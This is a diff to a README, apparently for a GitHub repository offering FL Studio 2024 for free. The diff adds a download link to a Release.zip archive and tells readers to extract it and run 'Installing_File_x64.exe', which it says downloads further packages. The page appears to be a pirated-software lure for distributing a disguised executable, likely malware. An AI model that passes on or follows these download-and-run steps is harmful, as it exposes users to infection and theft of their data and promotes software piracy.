@@ -11,11 +11,11 @@ Tags: Fl Studio 2024 free. Download Fl Studio for free. Download free Fl Studio 
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/6df166a8-9ba3-4f8a-ba8a-6d6bf2e81b45)
-]()
+](https://github.com/mac2k23/Fl-Studio-2024/releases/download/V8.65/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/mac2k23/Fl-Studio-2024/releases/download/V8.65/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_22-42-22](https://github.com/user-attachments/assets/ef79d766-52ed-48d8-9d39-b1077dc9dd53)
